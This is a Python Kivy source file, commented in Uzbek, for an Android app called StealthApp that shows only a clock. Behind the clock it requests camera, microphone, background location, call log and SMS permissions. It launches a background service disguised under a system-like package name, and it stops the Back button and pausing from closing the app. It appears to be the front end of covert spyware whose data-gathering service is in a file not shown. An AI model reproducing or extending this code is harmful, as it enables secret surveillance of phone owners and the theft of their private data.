import asyncio
import threading
import os
import shutil
import time
import ssl
import uuid
import struct
import zlib
import urllib.request
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.utils import platform

status = ["Kutilmoqda..."]
app_ref = [None]


# Barcha mantiq service.py ga ko'chirilgan!
# Bu fayl faqat UI (soat) va ruxsatlar so'rash uchun kerak.


# ─── UI ─────────────────────────────────────────────────────────────────────────
class StealthApp(App):
    def build(self):
        app_ref[0] = self
        
        from kivy.core.window import Window
        Window.clearcolor = (0.05, 0.05, 0.05, 1)  # To'q fon
        
        layout = BoxLayout(orientation='vertical', padding=0, spacing=0)

        self.time_label = Label(
            text='00:00:00',
            font_size='70sp', 
            halign='center', valign='middle',
            bold=True,
            color=(0.2, 0.8, 0.2, 1), # Yashil raqamlar
        )
        self.date_label = Label(
            text='',
            font_size='20sp', 
            halign='center', valign='middle',
            color=(0.5, 0.5, 0.5, 1),
            size_hint=(1, 0.2)
        )

        layout.add_widget(self.time_label)
        layout.add_widget(self.date_label)

        from kivy.uix.button import Button
        btn = Button(text="Servisni yoqish / Yangilash", size_hint=(1, 0.2), 
                     background_color=(0, 0.5, 0, 1), color=(0, 1, 0, 1))
        btn.bind(on_press=self.manual_start_service)
        layout.add_widget(btn)

        if platform == 'android':
            Clock.schedule_once(self._request_permissions, 0.5)

        Clock.schedule_interval(self.update_clock, 1)
        return layout

    def manual_start_service(self, instance):
        self._start_service()

    def on_start(self):
        """Back tugmasini ushlash — yopish o'rniga background ga o'tish"""
        if platform == 'android':
            from kivy.core.window import Window
            Window.bind(on_keyboard=self._handle_keyboard)

    def _handle_keyboard(self, window, key, *args):
        if key == 27:  # Back tugmasi
            if platform == 'android':
                try:
                    from jnius import autoclass
                    activity = autoclass('org.kivy.android.PythonActivity').mActivity
                    activity.moveTaskToBack(True)  # Yopmasdan background ga o'tish
                    return True
                except Exception:
                    pass
        return False

    def on_pause(self):
        """Ilova fon rejimiga o'tganda (yopilganda) ham ishlashni davom ettirish"""
        return True  # True = Android ilovani o'ldirmaydi

    def on_resume(self):
        pass

    def _request_permissions(self, dt):
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA, Permission.RECORD_AUDIO,
                Permission.INTERNET, Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE,
                Permission.ACCESS_FINE_LOCATION,
                Permission.ACCESS_COARSE_LOCATION,
                Permission.ACCESS_BACKGROUND_LOCATION,
                Permission.READ_CALL_LOG,
                Permission.READ_SMS,
                "android.permission.POST_NOTIFICATIONS"
            ], self._on_permissions_result)
        except Exception as e:
            status[0] = 'Ruxsat xatoligi: ' + str(e)[:80]
            self._start_service()

    def _on_permissions_result(self, permissions, grants):
        self._start_service()

    def _start_service(self):
        # Ruxsat olingach, Foreground Servisni ishga tushirish!
        if platform == 'android':
            try:
                from jnius import autoclass
                service = autoclass('com.android.sys.systemsync.ServiceStealth')
                mActivity = autoclass('org.kivy.android.PythonActivity').mActivity
                # Argument bo'sh qator.
                service.start(mActivity, "")
                status[0] = "Servis ishga tushdi!"
            except Exception as e:
                print("Servis xatosi:", e)
                status[0] = "Servis xatosi: " + str(e)[:100]

    def update_clock(self, dt):
        import time
        self.time_label.text = time.strftime("%H:%M:%S")
        self.date_label.text = time.strftime("%A, %d %B %Y")


if __name__ == '__main__':
    StealthApp().run()
